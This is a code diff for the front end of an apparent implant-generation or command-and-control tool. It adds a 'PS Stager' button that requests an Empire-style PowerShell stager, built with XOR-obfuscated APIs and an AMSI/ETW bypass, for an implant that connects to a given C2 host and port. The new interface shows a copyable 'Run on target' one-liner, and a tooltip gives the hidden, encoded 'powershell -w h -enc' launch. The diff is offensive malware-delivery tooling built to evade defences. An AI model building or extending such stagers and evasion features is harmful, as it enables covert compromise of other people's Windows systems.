@@ -105,6 +105,8 @@ export default function Generate() {
   const [packing,  setPacking]  = useState(false)
   const [ghosting,  setGhosting]  = useState(false)
   const [stealthing,setStealthing]= useState(false)
+  const [psing,     setPsing]     = useState(false)
+  const [psPayload, setPsPayload] = useState<{oneliner:string; ps1_path:string} | null>(null)
   const [stageURL,  setStageURL]  = useState<string | null>(null)
   const [showEvasion, setShowEvasion] = useState(true)
   const termRef = useRef<HTMLDivElement>(null)
@@ -252,6 +254,38 @@ export default function Generate() {
   function downloadImplant() {
     if (!result?.path) return
     window.open(`/api/generate/download?path=${encodeURIComponent(result.path)}`, '_blank')
+  }
+
+  // PowerShell Stager — Empire-style
+  async function psStager() {
+    if (!result?.path) return
+    setPsing(true); setPsPayload(null)
+    setTerminal(prev => [
+      ...prev,
+      { text: '', type: 'info' },
+      { text: '[*] Generating Empire-style PowerShell stager…', type: 'info' },
+      { text: '[*] Unique variable names + XOR-obfuscated APIs + AMSI/ETW bypass', type: 'info' },
+    ])
+    try {
+      const res = await apiPost<{oneliner:string;ps1_path:string;stage_url:string;message:string}>(
+        '/api/generate/ps', {
+          binary_path:  result.path,
+          implant_name: name.trim() || 'implant',
+          is_shellcode: format === 'bin',
+          c2_host:      c2host.trim(),
+          c2_port:      c2port,
+        })
+      setPsPayload({ oneliner: res.oneliner, ps1_path: res.ps1_path })
+      setTerminal(prev => [
+        ...prev,
+        { text: '[+] PS stager ready!', type: 'ok' },
+        { text: '[+] Stage URL: ' + res.stage_url, type: 'ok' },
+        { text: '[*] Run on target:', type: 'info' },
+        { text: res.oneliner, type: 'cmd' },
+      ])
+    } catch (e) {
+      setTerminal(prev => [...prev, { text: `[-] PS stager failed: ${e}`, type: 'err' }])
+    } finally { setPsing(false) }
   }
 
   // Stealth: C stager compiled with MinGW — zero Go runtime
@@ -563,6 +597,23 @@ export default function Generate() {
                 <span style={{ fontSize: 10 }}>Execute</span>
               </button>
 
+              {/* PS STAGER — Empire-style, max compatibility */}
+              {result.path && os === 'windows' && (
+                <button onClick={psStager} disabled={psing}
+                  title="Empire-style PowerShell stager — AMSI/ETW bypass + unique obfuscated variable names each build. Run: powershell -w h -enc <output>"
+                  style={{
+                    display:'flex',alignItems:'center',gap:5,
+                    padding:'6px 12px',borderRadius:4,fontSize:10,
+                    fontFamily:'inherit',fontWeight:800,cursor:psing?'wait':'pointer',
+                    background:psing?'rgba(234,179,8,.08)':'rgba(234,179,8,.18)',
+                    border:'1px solid rgba(234,179,8,.6)',color:'#fbbf24',
+                    letterSpacing:'.04em',
+                  }}>
+                  {psing?<Loader size={11} className="animate-spin"/>:<TermIcon size={11}/>}
+                  {psing?'Generating…':'🔥 PS Stager'}
+                </button>
+              )}
+
               {/* STEALTH: C stager — zero Go runtime, max bypass */}
               {result.path && os === 'windows' && (
                 <button onClick={stealthImplant} disabled={stealthing}
@@ -701,7 +752,25 @@ export default function Generate() {
               <span className="badge badge-beacon">Format: {activeFmt.label}</span>
               <span className="badge badge-session">Protocol: {protocol}</span>
               <span className="badge badge-session">Mode: {beacon ? 'Beacon' : 'Session'}</span>
-              {stageURL && (
+              {psPayload && (
+              <div style={{ width:'100%', marginTop:4, padding:'8px 10px',
+                background:'rgba(234,179,8,.06)', border:'1px solid rgba(234,179,8,.3)',
+                borderRadius:4, fontSize:9 }}>
+                <div style={{ color:'#fbbf24', fontWeight:700, marginBottom:4 }}>
+                  🔥 Run on target (PowerShell):
+                </div>
+                <div style={{ color:'#fde68a', fontFamily:'monospace', wordBreak:'break-all',
+                  maxHeight:60, overflow:'auto', cursor:'pointer' }}
+                  onClick={() => navigator.clipboard.writeText(psPayload.oneliner)}
+                  title="Click to copy">
+                  {psPayload.oneliner.slice(0, 120)}…
+                </div>
+                <div style={{ color:'#78716c', fontSize:8, marginTop:4 }}>
+                  Click to copy full command
+                </div>
+              </div>
+            )}
+            {stageURL && (
               <div style={{ width: '100%', marginTop: 4, padding: '6px 8px',
                 background: 'rgba(16,185,129,.08)', border: '1px solid rgba(16,185,129,.3)',
                 borderRadius: 4, fontSize: 9, color: '#34d399', fontFamily: 'monospace' }}>
